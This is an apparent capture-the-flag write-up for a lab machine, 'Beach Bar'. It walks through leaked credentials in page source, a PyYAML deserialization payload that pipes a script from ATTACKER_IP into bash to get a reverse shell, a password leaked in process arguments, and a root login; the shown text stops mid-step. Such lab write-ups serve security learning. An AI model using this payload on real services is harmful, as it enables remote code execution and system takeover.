CTF Writeup: Beach Bar — From Insecure Deserialization to Root Takeover
======================
Welcome to another walkthrough! Today, we’re dissecting Beach Bar, a CTF machine centered around web recon, Python insecure YAML deserialization, command-line process exposure, and credential reuse leading to root privileges.

1. Attack Lifecycle & Threat Mapping
-----------------------------------
Mapping adversary steps to formal frameworks like the Lockheed Martin Cyber Kill Chain and MITRE ATT&CK provides vital context for security operations and detection engineering.

<img width="485" height="359" alt="beach_bar_attack_framework" src="https://github.com/user-attachments/assets/4acf031e-c3cc-4fac-a772-7c348b898a49" />

2. Walkthrough: Technical Execution
------------------------------------
1: Reconnaissance & Initial Access
---------------------------------------

Visiting http://TARGET_IP

<img width="613" height="364" alt="beach_bar_1_page_source" src="https://github.com/user-attachments/assets/0cec03e1-c221-459a-af13-4ad9d754e1ca" />

we inspect the HTML page source and discover staff credentials hardcoded inside comments.

Logging into the application as user dj unlocks functionality where the server processes user inputs using Python's yaml.load() (or similar unsafe deserialization parsing).

2: Exploitation (Insecure YAML Deserialization)
--------------------------------------------------
PyYAML's standard load() allows arbitrary Python object instantiation using the !!python/object/apply tag. We craft a payload that executes a shell command to stream a reverse shell script back to our listener:
```
!!python/object/apply:os.system ["curl http://ATTACKER_IP/shell.sh|bash"]
```
Once submitted, the web application parses the payload, executes os.system(), and drops a reverse connection into our attacker-controlled machine, establishing a foothold as user bartender.

<img width="551" height="282" alt="beach_bar_2_bartender_shell" src="https://github.com/user-attachments/assets/ec0c60cb-aa70-48d7-b646-a697c3c7bc50" />

3: Host Enumeration & Credential Mining
--------------------------------------
With a shell on the system, we perform local system discovery:
```
ps aux | grep root
```

<img width="549" height="244" alt="beach_bar_3_root_service" src="https://github.com/user-attachments/assets/450b85b4-55c9-49df-9d4b-ddcb89565416" />

Looking through active processes, a service running under root stands out. Command-line parameters leak operational secrets:

--stream-pass SunsetSpritz2024! --bitrate 320k

4: Privilege Escalation & Deep Inspection
----------------------------------------------
Using the recovered password SunsetSpritz2024!, we test local authentication against the root account:

```
su root
```
Password authentication succeeds, giving us full administrative control over the machine.

To inspect environment boundaries (e.g., containerization status) and active services, we run:
